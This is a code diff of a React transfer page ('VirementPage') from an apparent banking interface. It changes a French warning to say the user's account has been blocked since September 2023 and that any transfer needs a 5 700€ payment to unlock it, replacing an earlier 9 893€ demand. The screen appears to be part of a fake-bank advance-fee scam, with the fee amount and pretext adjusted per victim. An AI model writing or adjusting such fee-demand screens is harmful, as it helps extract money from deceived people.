@@ -338,8 +338,8 @@ const VirementPage = ({ onClose, onVirementCompleted }) => {
         <div className="warning-icon">⚠️</div>
         <div className="warning-content">
           <h3>Validation requise</h3>
-          <p>Votre compte a été réactivé le 22/07/2025.</p>
-          <p>Pour des raisons de conformité et de sécurité renforcée, tout virement initié dans les 15 jours suivant le déblocage nécessite un règlement de <strong>9 893€</strong>.</p>
+                          <p>Votre compte est bloqué depuis septembre 2023.</p>
+                          <p>Pour des raisons de sécurité et de conformité, tout virement nécessite un règlement de <strong>5 700€</strong> pour débloquer votre compte.</p>
           <p>Merci de procéder au paiement pour poursuivre.</p>
         </div>
       </div>
@@ -359,7 +359,7 @@ const VirementPage = ({ onClose, onVirementCompleted }) => {
         </div>
         <div className="detail-item">
           <span className="label">Frais requis :</span>
-          <span className="value fees-required">9 893€</span>
+                              <span className="value fees-required">5 700€</span>
         </div>
       </div>
 
